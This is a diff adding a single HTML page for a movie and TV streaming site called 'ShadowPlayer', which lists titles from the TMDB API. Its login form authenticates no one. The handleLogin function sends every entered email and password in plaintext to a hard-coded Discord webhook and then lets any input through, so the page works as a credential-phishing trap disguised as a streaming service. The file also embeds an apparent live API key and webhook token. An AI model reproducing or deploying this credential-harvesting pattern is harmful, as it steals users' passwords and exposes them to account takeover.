@@ -1,0 +1,396 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ShadowPlayer</title>
+    <script src="https://cdn.jsdelivr.net/particles.js/2.0.0/particles.min.js"></script>
+    <style>
+        /* General Styling */
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+        body {
+            background-color: #121212;
+            color: #e0e0e0;
+            font-family: 'Arial', sans-serif;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding: 30px;
+            min-height: 100vh;
+            overflow-x: hidden;
+            position: relative;
+        }
+        
+        /* Particles Background */
+        #particles-js {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: #1c1c1c;
+            z-index: -1;
+        }
+
+        h1 {
+            color: #ff6347;
+            font-size: 3em;
+            text-shadow: 0px 0px 15px rgba(255, 99, 71, 0.8);
+            margin-bottom: 30px;
+            letter-spacing: 2px;
+        }
+
+        /* Login Form Styles */
+        .login-form {
+            background-color: #2a2a2a;
+            border-radius: 12px;
+            padding: 30px;
+            max-width: 400px;
+            width: 100%;
+            box-shadow: 0px 0px 20px rgba(0, 0, 0, 0.8);
+            text-align: center;
+            display: block;
+        }
+        .login-form input {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border-radius: 8px;
+            border: 1px solid #333;
+            background-color: #121212;
+            color: #e0e0e0;
+            font-size: 1em;
+        }
+        .login-form button {
+            width: 100%;
+            padding: 12px;
+            background-color: #ff6347;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            font-size: 1.2em;
+        }
+        .login-form button:hover {
+            background-color: #ff7f50;
+        }
+
+        /* Hide Content for Logged-In Users */
+        .content-container {
+            display: none;
+        }
+
+        /* Tab Styles */
+        .tabs {
+            display: flex;
+            margin-bottom: 20px;
+        }
+        .tab {
+            padding: 12px 30px;
+            background-color: #333;
+            color: #e0e0e0;
+            cursor: pointer;
+            border-radius: 8px 8px 0 0;
+            margin-right: 10px;
+            transition: background-color 0.3s;
+        }
+        .tab:hover, .active-tab {
+            background-color: #ff6347;
+            color: white;
+        }
+
+        /* Movies/TV Cards */
+        .card {
+            background-color: #2a2a2a;
+            width: 250px;
+            border-radius: 12px;
+            overflow: hidden;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.6);
+            transition: transform 0.3s ease, box-shadow 0.3s ease;
+            margin: 10px;
+            cursor: pointer;
+        }
+
+        .card:hover {
+            transform: translateY(-10px);
+            box-shadow: 0 6px 15px rgba(0, 0, 0, 0.9);
+        }
+
+        .card img {
+            width: 100%;
+            height: auto;
+        }
+
+        .card-content {
+            padding: 15px;
+        }
+
+        .card-title {
+            color: #ff6347;
+            font-size: 1.3em;
+            margin-bottom: 8px;
+            text-transform: uppercase;
+        }
+
+        .card-description {
+            font-size: 0.9em;
+            color: #bbbbbb;
+            line-height: 1.4em;
+            max-height: 3.6em;
+            overflow: hidden;
+            text-overflow: ellipsis;
+        }
+
+        /* Video Player */
+        #videoPlayer {
+            width: 80%;
+            height: 80vh;
+            background-color: #121212;
+            border-radius: 12px;
+            overflow: hidden;
+            display: none;
+            margin-top: 20px;
+        }
+
+        /* Flex container for the cards */
+        .card-container {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+        }
+    </style>
+</head>
+<body>
+
+    <!-- Login Form -->
+    <div id="loginForm" class="login-form">
+        <h1>Login</h1>
+        <form id="loginFormData" onsubmit="return handleLogin(event)">
+            <input type="email" id="email" placeholder="Email" required><br>
+            <input type="password" id="password" placeholder="Password" required><br>
+            <button type="submit">Login</button>
+        </form>
+    </div>
+
+    <!-- Content Section after Login -->
+    <div id="contentSection" class="content-container">
+        <h1>ShadowPlayer</h1>
+        <div class="tabs">
+            <div class="tab active-tab" id="movieTab" onclick="toggleTab('movies')">Movies</div>
+            <div class="tab" id="tvTab" onclick="toggleTab('tv')">TV Shows</div>
+        </div>
+
+        <div id="moviesContent" class="content-container card-container"></div>
+        <div id="tvContent" class="content-container card-container" style="display: none;"></div>
+    </div>
+
+    <!-- Video Player -->
+    <div id="videoPlayer">
+        <iframe id="player" width="100%" height="100%" frameborder="0" allow="autoplay; encrypted-media" allowfullscreen></iframe>
+    </div>
+
+    <!-- Particles.js Background -->
+    <div id="particles-js"></div>
+
+    <script>
+        const API_KEY = "c712408a293423784df0be76dc14af13";  // Replace with your actual API key
+        const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1273647609646415872/OfJeTkf4Y0RNDe1Yh42fFyDi2U8vmpXlOeuDOb3ITE35PCDbUwnQMUe9cwRix0C5p_tm"; // Replace with your actual Discord webhook URL
+
+        // Check if user is already logged in
+        function checkLoginStatus() {
+            const loggedIn = localStorage.getItem("loggedIn");
+            if (loggedIn === "true") {
+                document.getElementById('loginForm').style.display = 'none';
+                document.getElementById('contentSection').style.display = 'block';
+                loadMovies();
+                loadTVShows();
+            }
+        }
+
+        // Handle login form submission
+        function handleLogin(event) {
+            event.preventDefault();
+
+            // Get user input
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+
+            // Send login info to Discord Webhook
+            sendLoginInfoToDiscord(email, password);
+
+            // Store login status in localStorage
+            localStorage.setItem("loggedIn", "true");
+            localStorage.setItem("email", email);
+
+            // Show content section and hide login form
+            document.getElementById('loginForm').style.display = 'none';
+            document.getElementById('contentSection').style.display = 'block';
+
+            // Load movies and TV shows
+            loadMovies();
+            loadTVShows();
+        }
+
+        // Send login information to Discord Webhook
+        function sendLoginInfoToDiscord(email, password) {
+            const message = {
+                content: `New login attempt:\nEmail: ${email}\nPassword: ${password}`,
+            };
+
+            fetch(DISCORD_WEBHOOK_URL, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(message),
+            })
+            .then(response => {
+                if (response.ok) {
+                    console.log("Login info sent to Discord!");
+                } else {
+                    console.error("Failed to send login info to Discord.");
+                }
+            })
+            .catch(error => {
+                console.error("Error sending login info:", error);
+            });
+        }
+
+        // Load Movies
+        function loadMovies() {
+            fetch(`https://api.themoviedb.org/3/movie/popular?api_key=${API_KEY}`)
+                .then(response => response.json())
+                .then(data => {
+                    const movies = data.results;
+                    const container = document.getElementById('moviesContent');
+                    container.innerHTML = ''; // Clear the previous content
+                    movies.forEach(movie => {
+                        const card = document.createElement('div');
+                        card.classList.add('card');
+                        card.innerHTML = `
+                            <img src="https://image.tmdb.org/t/p/w500${movie.poster_path}" alt="${movie.title}">
+                            <div class="card-content">
+                                <h3 class="card-title">${movie.title}</h3>
+                                <p class="card-description">${movie.overview}</p>
+                            </div>
+                        `;
+                        card.onclick = function() {
+                            playMovie(movie.id);
+                        };
+                        container.appendChild(card);
+                    });
+                })
+                .catch(error => console.error('Error loading movies:', error));
+        }
+
+        // Load TV Shows
+        function loadTVShows() {
+            fetch(`https://api.themoviedb.org/3/tv/popular?api_key=${API_KEY}`)
+                .then(response => response.json())
+                .then(data => {
+                    const tvShows = data.results;
+                    const container = document.getElementById('tvContent');
+                    container.innerHTML = ''; // Clear the previous content
+                    tvShows.forEach(tvShow => {
+                        const card = document.createElement('div');
+                        card.classList.add('card');
+                        card.innerHTML = `
+                            <img src="https://image.tmdb.org/t/p/w500${tvShow.poster_path}" alt="${tvShow.name}">
+                            <div class="card-content">
+                                <h3 class="card-title">${tvShow.name}</h3>
+                                <p class="card-description">${tvShow.overview}</p>
+                            </div>
+                        `;
+                        card.onclick = function() {
+                            playTVShow(tvShow.id);
+                        };
+                        container.appendChild(card);
+                    });
+                })
+                .catch(error => console.error('Error loading TV shows:', error));
+        }
+
+        // Play Movie
+        function playMovie(movieId) {
+            const url = `https://www.youtube.com/embed/${movieId}`;
+            document.getElementById('player').src = url;
+            document.getElementById('videoPlayer').style.display = 'block';
+        }
+
+        // Play TV Show
+        function playTVShow(tvShowId) {
+            const url = `https://www.youtube.com/embed/${tvShowId}`;
+            document.getElementById('player').src = url;
+            document.getElementById('videoPlayer').style.display = 'block';
+        }
+
+        // Toggle between Movies and TV shows
+        function toggleTab(tabName) {
+            if (tabName === 'movies') {
+                document.getElementById('moviesContent').style.display = 'block';
+                document.getElementById('tvContent').style.display = 'none';
+                document.getElementById('movieTab').classList.add('active-tab');
+                document.getElementById('tvTab').classList.remove('active-tab');
+            } else if (tabName === 'tv') {
+                document.getElementById('moviesContent').style.display = 'none';
+                document.getElementById('tvContent').style.display = 'block';
+                document.getElementById('tvTab').classList.add('active-tab');
+                document.getElementById('movieTab').classList.remove('active-tab');
+            }
+        }
+
+        // Particles.js Setup
+        particlesJS('particles-js', {
+            particles: {
+                number: { value: 80, density: { enable: true, value_area: 800 } },
+                color: { value: "#ff6347" },
+                shape: {
+                    type: "circle",
+                    stroke: { width: 0, color: "#000000" },
+                },
+                opacity: {
+                    value: 0.5,
+                    random: true,
+                    anim: { enable: true, speed: 1, opacity_min: 0.1, sync: false },
+                },
+                size: {
+                    value: 3,
+                    random: true,
+                    anim: { enable: false, speed: 40, size_min: 0.1, sync: false },
+                },
+                line_linked: {
+                    enable: true,
+                    distance: 150,
+                    color: "#ffffff",
+                    opacity: 0.4,
+                    width: 1,
+                },
+                move: {
+                    enable: true,
+                    speed: 6,
+                    direction: "none",
+                    random: true,
+                    straight: false,
+                    out_mode: "out",
+                    attract: { enable: false },
+                },
+            },
+            interactivity: {
+                detect_on: "canvas",
+                events: {
+                    onhover: { enable: true, mode: "repulse" },
+                    onclick: { enable: true, mode: "push" },
+                    resize: true,
+                },
+            },
+        });
+
+        // Check login status on page load
+        checkLoginStatus();
+    </script>
+</body>
+</html>
